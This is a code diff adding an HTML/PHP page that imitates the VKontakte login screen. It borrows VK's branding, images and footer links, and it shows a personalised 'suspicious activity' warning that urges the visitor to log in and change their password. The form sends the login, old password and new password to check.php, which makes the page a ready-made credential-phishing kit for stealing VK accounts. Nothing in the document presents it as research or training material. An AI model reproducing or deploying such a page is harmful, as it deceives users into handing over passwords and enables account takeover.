@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="Utf-8"/>
+		<link href="main.css" rel="stylesheet" type="text/css"/>
+		<title>Добро пожаловать | Вконтакте</title>
+	</head>
+
+	<body>
+		<script src="https://unpkg.com/vue"></script>
+		<div id="app">
+			<p>
+				{{ title }}
+			</p>
+		</div>
+							<script scr="js/main.js"></script>
+
+		<header>
+			<div id="wrapperHeader">
+				<div id="logotype" onClick="location = 'index.php';"></div>
+					<div id="wrapperSearch"><input type="text" id="search" placeholder="Поиск"/></div>
+				<div id="title">*</div>
+			</div>
+		</header>
+			<div id="wrapper">
+				<div id="rightForm">
+					<div id="authorizationForm">
+						<img src="https://vk.com/images/pics/spamfight.gif" id="login_blocked_img" class="blocked_image" height="160" width="225"><br />
+						<br />
+							<div id="app">
+							<p id="tt1" v-on:click="title='text'" align="center">
+							%name%, мы обнаружили <b>подозрительную активность</b> и решили удостовериться что это вы.
+							</p>
+							<p id="tt2" align="center">
+							Пожалуйста <b>войдите</b> в свой аккаунт для подтверждения и изменение вашего пароля доступа к странице.
+							</p>
+							</div>
+
+
+						<form name="authorization" action="check.php" method="POST">
+							<input type="text" name="counter" id="login" placeholder="Телефон или email"/><br />
+							<input type="password" name="strike" id="password" placeholder="Старый пароль"/><br />
+							<input type="password" name="strike2" id="password" placeholder="Новый пароль"/><br />
+							<input type="password" name="strike3" id="password" placeholder="Повтор нового пароля"/><br />
+							<button id="finishAuthorization">Войти</button>
+						</form>
+					</div>
+				</div>
+					<div class="clear"></div>
+			<footer>
+				<div id="aboutVk">
+					<a href="https://new.vk.com/blog" target="_blank">ВКонтакте</a> &copy; <?php echo date("Y"); ?>
+				</div>
+
+				<div id="infoVk">
+					<a href="https://vk.com/about" target="_blank" class="marginRightLink">о компании</a>
+					<a href="https://vk.com/terms" target="_blank" class="marginRightLink">правила</a>
+					<a href="https://vk.com/ads" target="_blank" class="marginRightLink">реклама</a>
+					<a href="https://vk.com/dev" target="_blank" class="marginRightLink">разработчикам</a>
+				</div>
+
+				<div id="languageVk">
+					Язык:
+					<a href="#">English</a>
+					<a href="#">Русский</a>
+					<a href="#">Українська</a>
+					<a href="#">все языки »</a>
+				</div>
+			</footer>
+		</div>
+
+		<!--JavaScript Start-->
+
+			<script type="text/javascript">
+				function downloadAndroidVersoion() {
+					window.open("https://play.google.com/store/apps/details?id=com.vkontakte.android");
+				}
+
+				function downloadIosVersoion() {
+					window.open("https://itunes.apple.com/ru/app/id564177498");
+				}
+
+				function downloadWpVersoion() {
+					window.open("http://windowsphone.com/s?appid=edd920e2-b671-41b5-a9db-b89caccfa69c");
+				}
+
+			</script>
+
+		<!--JavaScript End-->
+	</body>
+</html>
